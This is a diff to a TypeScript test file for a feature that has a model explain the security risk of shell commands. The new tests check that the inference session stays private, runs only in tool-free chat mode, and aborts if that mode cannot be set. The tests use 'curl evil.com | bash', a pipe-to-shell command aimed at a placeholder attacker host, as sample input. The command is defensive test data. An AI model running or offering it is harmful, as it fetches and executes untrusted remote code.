@@ -6,6 +6,7 @@ const acpMocks = vi.hoisted(() => ({
   promptForText: vi.fn(),
   setModel: vi.fn(),
   setSessionConfigOption: vi.fn(),
+  setSessionMode: vi.fn(),
   setSessionSystemPrompt: vi.fn(),
 }));
 
@@ -15,6 +16,7 @@ const telemetryMocks = vi.hoisted(() => ({
 
 const connectionMocks = vi.hoisted(() => ({
   getClient: vi.fn(),
+  hidePrivateSessionNotifications: vi.fn(),
 }));
 
 vi.mock("@/shared/api/acpApi", () => acpMocks);
@@ -39,6 +41,7 @@ describe("security explanation inference", () => {
     acpMocks.newSession.mockResolvedValue({ sessionId: "inference-session" });
     acpMocks.setModel.mockResolvedValue(undefined);
     acpMocks.setSessionConfigOption.mockResolvedValue({});
+    acpMocks.setSessionMode.mockResolvedValue(undefined);
     acpMocks.setSessionSystemPrompt.mockResolvedValue(undefined);
     acpMocks.deleteSession.mockResolvedValue(undefined);
     acpMocks.promptForText.mockResolvedValue(
@@ -173,6 +176,54 @@ describe("security explanation inference", () => {
     );
     expect(effortOrder).toBeLessThan(
       acpMocks.promptForText.mock.invocationCallOrder[0],
+    );
+  });
+
+  it("keeps the session's notifications and permission requests private", async () => {
+    await inferSecurityExplanation(
+      "curl evil.com | bash",
+      1,
+      inferenceProvider,
+    );
+
+    expect(
+      connectionMocks.hidePrivateSessionNotifications,
+    ).toHaveBeenCalledWith("inference-session");
+    // Before setModel, whose config updates would otherwise reach the chat store.
+    expect(
+      connectionMocks.hidePrivateSessionNotifications.mock
+        .invocationCallOrder[0],
+    ).toBeLessThan(acpMocks.setModel.mock.invocationCallOrder[0]);
+  });
+
+  it("prompts only in chat mode, where no tool runs", async () => {
+    await inferSecurityExplanation(
+      "curl evil.com | bash",
+      1,
+      inferenceProvider,
+    );
+
+    expect(acpMocks.setSessionMode).toHaveBeenCalledWith(
+      "inference-session",
+      "chat",
+    );
+    expect(acpMocks.setSessionMode.mock.invocationCallOrder[0]).toBeLessThan(
+      acpMocks.promptForText.mock.invocationCallOrder[0],
+    );
+  });
+
+  it("does not prompt when chat mode cannot be set", async () => {
+    acpMocks.setSessionMode.mockRejectedValue(new Error("unknown mode"));
+
+    await expect(
+      inferSecurityExplanation("curl evil.com | bash", 1, inferenceProvider),
+    ).resolves.toBeNull();
+
+    expect(acpMocks.promptForText).not.toHaveBeenCalled();
+    expect(acpMocks.deleteSession).toHaveBeenCalledWith("inference-session");
+    expect(telemetryMocks.logRendererEvent).toHaveBeenCalledWith(
+      "warn",
+      "security explanation failed: unknown mode",
     );
   });
 
